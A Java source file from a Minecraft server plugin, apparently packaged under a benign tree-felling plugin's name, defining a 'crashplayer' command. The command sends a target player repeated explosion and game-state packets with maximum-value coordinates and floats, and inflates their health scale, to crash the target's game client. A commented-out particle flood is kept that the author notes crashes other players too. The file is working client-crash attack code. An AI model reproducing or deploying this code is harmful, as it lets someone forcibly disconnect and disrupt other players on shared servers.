package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collections;

@Command.Info(command = "crashplayer", description = "Crashes player's mc by sending magical shit.", category = CommandCategory.Player, requiredArgs = 1)
public class CrashPlayer extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        for (String arg : args) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(arg);
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player \"" + arg + "\" is not online!");
                    continue;
                }
                p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " is being crashed using combined method (packet, health and particles)!");
                new BukkitRunnable() {
                    final Class<?> packetGameStateClass = ReflectionUtils.getMinecraftClass("PacketPlayOutExplosion");
                    final Object nmsPlayer = anotherPlayer.getClass().getMethod("getHandle").invoke(anotherPlayer);
                    final Field playerConnectionField = nmsPlayer.getClass().getField("playerConnection");
                    final Object pConnection = playerConnectionField.get(nmsPlayer);
                    int times = 0;
                    final Class packetClass = ReflectionUtils.getMinecraftClass("Packet");
                    final Method sendPacket = pConnection.getClass().getMethod("sendPacket", packetClass);
                    Object packetPlayOutGameStateChange;
                    Object packetPlayOutExplosion;

                    @Override
                    public void run() {
                        if (times == 0) {
                            Class<?> vec3D = ReflectionUtils.getClassCached("{nms}.Vec3D");
                            Object c = ReflectionUtils.getConstructorCached(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
                            packetPlayOutExplosion = ReflectionUtils.getConstructorCached(packetGameStateClass, double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), c);
                            packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
                        }
                        if (times++ >= 100) {
                            p.sendMessage(Start.Prefix + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (crashing happened 100 times)");
                            this.cancel();
                            return;
                        }
                        if (!anotherPlayer.isOnline()) {
                            p.sendMessage(Start.Prefix + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (player disconnected)");
                            this.cancel();
                            return;
                        }
                        crashPlayer(anotherPlayer, sendPacket, pConnection, packetPlayOutGameStateChange, packetPlayOutExplosion);
                    }
                }.runTaskTimerAsynchronously(Start.Instance, 0L, 5L);
                p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " should be gone after 30 seconds (time out limit) now!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }

    private void crashPlayer(Player p, Method sendPacket, Object pConnection, Object packetPlayOutGameStateChange, Object packetPlayOutExplosion) {
//        ((CraftPlayer) p).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
        try {
            sendPacket.invoke(pConnection, packetPlayOutGameStateChange);
            sendPacket.invoke(pConnection, packetPlayOutExplosion);
        } catch (Exception ignored) {

        }
        // ↓ that crashes other playes :( ↓
        /*for (int f = 0; f < 1000; f++) {
            p.spawnParticle(Particle.HEART, p.getLocation(), Integer.MAX_VALUE);
            p.spawnParticle(Particle.EXPLOSION_HUGE, p.getLocation(), Integer.MAX_VALUE);
        }*/
        p.setHealthScale(Integer.MAX_VALUE);
    }
}